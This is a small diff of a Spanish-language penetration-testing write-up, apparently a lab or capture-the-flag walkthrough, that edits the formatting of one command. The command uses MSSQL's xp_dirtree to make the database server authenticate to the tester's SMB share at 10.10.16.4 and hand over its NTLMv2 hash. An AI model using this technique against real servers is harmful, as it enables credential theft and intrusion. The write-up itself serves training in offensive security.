@@ -210,8 +210,8 @@ SQL>
 No tenemos permisos para activar las opciones avanzadas para activar la funcion xp_cmdshell y ejecutar comandos a nivel del sistema.
 La base de datos no tiene nada interesante. LLegados a este punto comprobé si las credenciales eran validas a nivel de SMB. No lo eran, asi que probe a ver si puedo extraer el hash NTLMv2 a traves de la función xp_dirtree
 
-```SQL
-SQL> xp_dirtree '\\10.10.16.4\compartido\'
+```bash
+SQL xp_dirtree '\\10.10.16.4\compartido\'
 ```
 
 Si miramos nuestro servidor de SMB podemos ver que se ha autenticado y vemos el hash NTLMv2
